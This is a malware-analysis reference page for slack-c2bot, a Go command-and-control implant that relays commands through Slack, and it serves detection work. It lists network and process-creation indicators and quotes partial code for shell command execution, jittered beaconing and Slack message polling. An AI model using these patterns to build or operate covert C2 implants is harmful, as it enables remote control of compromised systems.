# slack-c2bot

## Table of Contents

- [slack-c2bot](#slack-c2bot)
  - [Table of Contents](#table-of-contents)
  - [Metadata](#metadata)
  - [Description](#description)
  - [Documentation](#documentation)
  - [Indicators](#indicators)
  - [Capabilities](#capabilities)
    - [Execute Commands via SHELL](#execute-commands-via-shell)
  - [Functionalities](#functionalities)
    - [handleSleep](#handlesleep)
    - [postMsg](#postmsg)
    - [GetChannelHistory](#getchannelhistory)

## Metadata

- Evaluator(s): [Nasreddine Bencherchali (@nas_bench)](https://twitter.com/nas_bench)
- Date: 24/01/2022
- Modified: 24/01/2022
- Source: [slack-c2bot](https://github.com/praetorian-inc/slack-c2bot)
- Implementation: Golang

## Description

> Slack C2bot is a Golang C2 that uses Slack as C&C channel

## Documentation

- [Slack C2bot - Usage](https://github.com/praetorian-inc/slack-c2bot#usage)
- [Using Slack Web Services as a C2 Channel (ATT&CK T1102)](https://www.praetorian.com/blog/using-slack-as-c2-channel-mitre-attack-web-service-t1102/)

## Indicators

| Description        | Indicator                                                                                                          | Reference                          |
|--------------------|--------------------------------------------------------------------------------------------------------------------|------------------------------------|
| HTTP Post Request   | ```https://slack.com/api/chat.postMessage``` | [Post Message](#postmsg) |
| HTTP Get Request   | ```https://slack.com/api/channels.history``` | [Get Channel History](#getchannelhistory) |
| User-Agent   | ```Go-http-client/1.1``` | [Get Channel History](#getchannelhistory)<br />[Post Message](#postmsg) |
| Process Creation (Windows)   | ```cmd.exe /c [COMMAND]``` | [Execute Commands via SHELL](#execute-commands-via-shell) |
| Process Creation (Linux)   | ```bash -c [COMMAND]```| [Execute Commands via SHELL](#execute-commands-via-shell) |

## Capabilities

### Execute Commands via SHELL

- Description: Execute commands sent from channel on the host
- Source Reference:
  - https://github.com/praetorian-inc/slack-c2bot/blob/master/implant.go#L34
- Indicators:
  - WINDOWS:
    - Call the `cmd.exe` binary with the `/C` flag

        ```go
        func runCmd(cmd string) string {
            .....
            if runtime.GOOS == "windows" {
                shell = "cmd.exe"
                shell_arg = "/C"
            }
            myCmd := exec.Command(shell, shell_arg, cmd)
            .....
        ```

  - LINUX:
    - Call the `bash` shell with the `-c` flag

        ```go
        func runCmd(cmd string) string {
            shell := "bash"
            shell_arg := "-c"
            .....
            myCmd := exec.Command(shell, shell_arg, cmd)
            .....
        ```

## Functionalities

### handleSleep

- Description: Handle sleep period of the agent
- Source Reference:
  - https://github.com/praetorian-inc/slack-c2bot/blob/master/implant.go#L25
- Indicators:
  - The default `sleep` value is `60` with applied jitter of 1 to 4. This means that the agent could sleep between a minimum value of `1 minute` and a max value of `4 minutes`

    ```go
    func handleSleep(sleep int) {
        rand.Seed(time.Now().UnixNano())
        min := 1
        max := 5
        num := rand.Intn(max - min) + min
        sleepWithJitter := sleep * num
        time.Sleep(time.Duration(sleepWithJitter) * time.Second)
    }
    ```

### postMsg

- Description: Post a message to a slack channel
- Source Reference:
  - https://github.com/praetorian-inc/slack-c2bot/blob/master/implant.go#L53
- Indicators:
  - Send `POST` request to the following URL: `https://slack.com/api/chat.postMessage`

    ```go
    ......
    func postMsg(api *slack.Client, chan_id string, msg string) {
        channelID, timestamp, err := api.PostMessage(chan_id, slack.MsgOptionText(msg, false))
    ......
    ```

  - The `slack` API package uses the `net/http` package behind the scene and since it doesn't specify any custom User-Agent, all request should be made using the default User-Agent: `Go-http-client/1.1`

### GetChannelHistory

- Description: Request a slack channel message history
- Source Reference:
  - https://github.com/praetorian-inc/slack-c2bot/blob/master/implant.go#L75
- Indicators:
  - Send `GET` request to the following URL: `https://slack.com/api/channels.history` (Note that this API has been deprecated and replaced by the `conversations.history` API)

    ```go
    historyParams := slack.HistoryParameters{Latest: "", Oldest: "0", Count: 2, Inclusive: false, Unreads:false,}
    history, err := api.GetChannelHistory(channel_id, historyParams)
    ```

  - The `slack` API package uses the `net/http` package behind the scene and since it doesn't specify any custom User-Agent, all request should be made using the default User-Agent: `Go-http-client/1.1`
